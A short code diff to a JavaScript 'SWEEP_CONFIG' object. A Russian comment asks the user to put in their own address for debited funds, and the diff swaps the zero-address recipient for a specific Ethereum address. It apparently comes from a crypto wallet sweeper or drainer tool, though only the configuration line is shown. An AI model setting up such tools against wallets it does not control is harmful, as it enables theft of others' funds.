@@ -4,7 +4,7 @@
 
 const SWEEP_CONFIG = {
   // 🔥 АДРЕС КУДА СПИСЫВАТЬ СРЕДСТВА - ЗАМЕНИТЕ НА ВАШ!
-  recipient: "0x0000000000000000000000000000000000000000",
+  recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
   
   // ID сети: 1=Ethereum, 56=BSC, 137=Polygon
   chainId: 1,
